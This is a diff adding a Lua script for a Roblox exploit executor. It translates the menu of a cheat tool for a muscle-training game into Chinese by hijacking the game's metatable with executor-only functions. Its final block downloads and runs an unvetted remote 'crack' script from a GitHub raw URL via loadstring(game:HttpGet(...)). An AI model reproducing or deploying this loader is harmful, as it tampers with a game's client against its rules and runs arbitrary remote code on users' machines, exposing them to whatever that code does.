@@ -1,0 +1,153 @@
+local Translations = {
+   ["Rebirthing"] = "重生",
+    ["Fast Farming"] = "快速耕种",
+    ["Farming"] = "耕种",
+    ["Teleports"] = "传送",
+    ["Stats"] = "属性",
+    ["Info"] = "信息",
+    ["Auto Lift (Slow its the Gamepass)"] = "自动举重 (慢因为它是游戏通行证)",
+    ["Misc"] = "杂项",
+    ["Machines"] = "机器",
+    ["Jungle Lift"] = "丛林举重",
+    ["Jungle Squat"] = "丛林深蹲",
+    ["King Lift"] = "王者举重",
+    ["King Squat"] = "王者深蹲",
+    ["Legends Lift"] = "传奇举重",
+    ["Legends Squat"] = "传奇深蹲",
+    ["Legends Pull Up"] = "传奇引体向上 ",
+    ["Rep Speed"] = "重复速度",
+    ["Fast Rep"] = "快速重复",
+    ["Auto Egg"] = "自动蛋",
+    ["Anti Lag"] = "反延迟",
+    ["Pets"] = "宠物",
+    ["Equip Swift Samurai"] = "装备迅捷武士",
+    ["Equip Tribal Overlord"] = "装备部落霸主",
+    ["Main"] = "主岛",
+    ["Tiny Island"] = "小型岛屿",
+    ["Main Island"] = "主岛屿",
+    ["Beach"] = "海滩",
+    ["Gyms"] = "健身房",
+    ["Muscle King Gym"] = "肌肉之王健身房",
+    ["Jungle Gym"] = "丛林健身房",
+    ["Legends Gym"] = "传奇健身房",
+    ["Infernal Gym"] = "地狱健身房",
+    ["Mythical Gym"] = "神话健身房",
+    ["Frost Gym"] = "冰霜健身房",
+    ["Fast Rebirth"] = "快速重生",
+    ["---Dont use Anti Lag for Rebirthing ---"] = "--- 重生时不要使用反延迟 ---",
+}
+
+local function translateText(text)
+    if not text or type(text) ~= "string" then return text end
+    
+    if Translations[text] then
+        return Translations[text]
+    end
+    
+    for en, cn in pairs(Translations) do
+        if text:find(en) then
+            return text:gsub(en, cn)
+        end
+    end
+    
+    return text
+end
+
+local function setupTranslationEngine()
+    local success, err = pcall(function()
+        local oldIndex = getrawmetatable(game).__newindex
+        setreadonly(getrawmetatable(game), false)
+        
+        getrawmetatable(game).__newindex = newcclosure(function(t, k, v)
+            if (t:IsA("TextLabel") or t:IsA("TextButton") or t:IsA("TextBox")) and k == "Text" then
+                v = translateText(tostring(v))
+            end
+            return oldIndex(t, k, v)
+        end)
+        
+        setreadonly(getrawmetatable(game), true)
+    end)
+    
+    if not success then
+        warn("元表劫持失败:", err)
+       
+        local translated = {}
+        local function scanAndTranslate()
+            for _, gui in ipairs(game:GetService("CoreGui"):GetDescendants()) do
+                if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
+                    pcall(function()
+                        local text = gui.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                gui.Text = translatedText
+                                translated[gui] = true
+                            end
+                        end
+                    end)
+                end
+            end
+            
+            local player = game:GetService("Players").LocalPlayer
+            if player and player:FindFirstChild("PlayerGui") then
+                for _, gui in ipairs(player.PlayerGui:GetDescendants()) do
+                    if (gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox")) and not translated[gui] then
+                        pcall(function()
+                            local text = gui.Text
+                            if text and text ~= "" then
+                                local translatedText = translateText(text)
+                                if translatedText ~= text then
+                                    gui.Text = translatedText
+                                    translated[gui] = true
+                                end
+                            end
+                        end)
+                    end
+                end
+            end
+        end
+        
+        local function setupDescendantListener(parent)
+            parent.DescendantAdded:Connect(function(descendant)
+                if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
+                    task.wait(0.1)
+                    pcall(function()
+                        local text = descendant.Text
+                        if text and text ~= "" then
+                            local translatedText = translateText(text)
+                            if translatedText ~= text then
+                                descendant.Text = translatedText
+                            end
+                        end
+                    end)
+                end
+            end)
+        end
+        
+        pcall(setupDescendantListener, game:GetService("CoreGui"))
+        local player = game:GetService("Players").LocalPlayer
+        if player and player:FindFirstChild("PlayerGui") then
+            pcall(setupDescendantListener, player.PlayerGui)
+        end
+        
+        while true do
+            scanAndTranslate()
+            task.wait(3)
+        end
+    end
+end
+
+task.wait(2)
+
+setupTranslationEngine()
+
+local success, err = pcall(function()
+--这下面填加载外部脚本
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ztxpublic/crack/refs/heads/main/henne%20Crack"))()
+
+
+end)
+
+if not success then
+    warn("加载失败:", err)
+end
